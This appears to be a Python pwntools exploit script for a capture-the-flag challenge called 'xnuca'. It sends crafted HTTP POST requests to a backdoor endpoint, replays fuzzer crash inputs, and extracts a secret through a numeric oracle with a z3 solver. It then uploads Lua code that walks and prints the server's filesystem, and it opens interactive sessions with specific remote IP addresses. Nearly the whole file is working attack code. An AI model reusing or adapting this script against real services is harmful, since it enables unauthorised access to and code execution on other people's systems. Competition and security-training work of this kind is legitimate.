#!/usr/bin/python
from pwn import *
import ctypes
from z3 import *
from os import listdir
from os.path import isfile, join
mypath='/home/ww9210/develop/ls/fuzzing/output/fuzzor02/crashes.2019-07-10-15:14:07/'

r = None
cnt=0
#context.log_level='DEBUG'
crash= True
crash= False

def test_crashes():
    onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]
    for filename in onlyfiles:
        r=remote('127.0.0.1',8000)
        print 'testing', filename
        test=file(join(mypath,filename),'r').read()
        #r.send("GET /dopwn HTTP/1.0\r\n\r\n")
        p="POST /backdoor HTTP/1.0\r\n"
        p+='Referer: pwn\r\n'
        p+='User-Agent: ww9210\r\n'
        p+='Content-Type: text/plain\r\n'
        p+='Content-length: '+str(len(test))+'\r\n\r\n'
        p+=test
        #p+='x'*25+'\x00'+'x'
        #p+='\r\n'
        #p+='\r\n'
        r.send(p)
        r.interactive()

def test_reverse():
    #r=remote('127.0.0.1',8000)
    r=remote('106.75.22.42',55231)
    # r=remote('127.0.0.1',8000)
    test=str(2401053089729745151)
    p='POST /1234 HTTP/1.0\r\n'
    p+='Referer: xnuca\r\n'
    p+='User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\r\n'
    p+='Keep-Alive: 300\r\n'
    p+='Connection: keep-alive\r\n'
    p+='Content-length: '+str(len(test))+'\r\n\r\n'
    p+=test
    r.send(p)
    r.send('12')
    r.send('1'*12)
    for i in range(255):
        r.send('12')
        r.send('2'*12)
    x=raw_input().strip('\n')
    r.send(str(len(x)))
    r.send(x)
    r.interactive()
    
#test_crashes()
#test_reverse()


def geto(x):
    global cnt
    r.recvuntil('number?\n')
    x = ctypes.c_int64(x).value
    r.send(str(len(str(x))).rjust(2,'0'))
    r.send(str(x))
    oracle = r.recvline().strip()
    print 'oracle:',repr(oracle)
    cnt +=1
    return int(oracle)

def binary_search(l,r,left=None):
    if r-l<=1:
        return r
    if left is not None:
        lv = left
    else:
        lv= geto(l)
    m = (l+r)/2
    y = geto(m)
    if y == lv:
        #if geto(m+1) != lv:
            #return ctypes.c_int64(m+1).value
        return ctypes.c_int64(binary_search(m,r,left=y)).value
    else:
        return ctypes.c_int64(binary_search(l,m,left=lv)).value


def solve():
    res1 = binary_search(0,1<<62)
    res2 = binary_search(1<<62,1<<63)
    res3 = binary_search(1<<63,(1<<63)+(1<<62))
    res4 = binary_search(3<<62,(1<<64)-1)
    print 'times',cnt
    print hex(res1),hex(res2),hex(res3),hex(res4)
    #for x in [res1,res2,res3,res4]:
        #print geto(x-1),geto(x),geto(x+1)
    sol = z3.Solver()
    ans = BitVec('ans',64)
    sol.add(ans+res1<=ans-3*res1)
    sol.add(ans+res2<=ans-3*res2)
    sol.add(ans+res3<=ans-3*res3)
    sol.add(ans+res4<=ans-3*res4)
    print sol.check()
    m = sol.model()
    res=m[ans].as_signed_long()
    print res
    print 'the secret is', hex(res)
    r.send('-1')
    r.recvuntil('did you get the secret?\n')
    r.send(str(len(str(res))))
    r.recvuntil('your guess?\n')
    r.send(str(res))

def reverse():
    global r
    #r=remote('127.0.0.1',8000)
    #r=remote('124.16.75.162',30009)
    #r=remote('127.0.0.1',8000)
    r=remote('106.75.22.42',10001)
    test=str(2401053089729745151)
    p='POST /1234 HTTP/1.0\r\n'
    p+='Referer: xnuca\r\n'
    p+='User-Agent: ww9210\r\n'
    p+='Keep-Alive: 300\r\n'
    p+='Connection: keep-alive\r\n'
    p+='Content-length: '+str(len(test))+'\r\n\r\n'
    p+=test
    r.send(p)
    print r.recvuntil('connection: close\r\n')
    r.recvline()
    print repr(r.recvline().strip())
    solve()
    if crash:
        onlyfiles = [f for f in listdir(mypath) if isfile(join(mypath, f))]
        for filename in onlyfiles:
            #if 'id:000093,sig:06,src:000000,op:havoc,rep:2' not in filename:
            if 'id:000094' not in filename:
                continue
            target = file(join(mypath, filename),'rb').read()
            r.send(str(len(target)).rjust(4,'0'))
            r.send(target)
    p = ''
    p += "print(stream)\n"
    p += "print('hello world')\n"
    #p += "local xxx = require 'lfs'\n"
    #p += "print(xxx)\n"
    p+='''
    posix = require "libfs"
    print(posix)
    local lfs = require "lfs"

function attrdir (path)
    for file in lfs.dir(path) do
        if file ~= "." and file ~= ".." then
            local f = path..'/'..file
            print ("\t "..f)
            local attr = lfs.attributes (f)
            assert (type(attr) == "table")
            if attr.mode == "directory" then
                attrdir (f)
            else
                for name, value in pairs(attr) do
                    print (name, value)
                end
            end
        end
    end
end

attrdir (".")
print(stream)
'''
    r.send(str(len(p)).rjust(4,'0'))
    r.send(p)
    
    r.interactive()

def exploit():
    global r
    r=remote('127.0.0.1',8000)
    test=str(-9223372036854775808)
    p='POST /1234 HTTP/1.0\r\n'
    p+='Referer: xnuca\r\n'
    p+='User-Agent: ww9210\r\n'
    p+='Keep-Alive: 300\r\n'
    p+='Connection: keep-alive\r\n'
    p+='Content-length: '+str(len(test))+'\r\n\r\n'
    p+=test
    r.send(p)
    print r.recvuntil('connection: close\r\n')
    r.recvline()
    print repr(r.recvline().strip())
    r.recvuntil('number?\n')
    r.send('-1')
    r.recvuntil('did you get the secret?\n')
    r.send(str(len(test)))
    r.recvuntil('your guess?\n')
    r.send(test)
    p = ''
    p += file('doit.lua','r').read()
    print len(p)
    r.send(str(len(p)).rjust(4,'0'))
    r.send(p)
    r.interactive()


reverse()
#exploit()
#test_crashes()
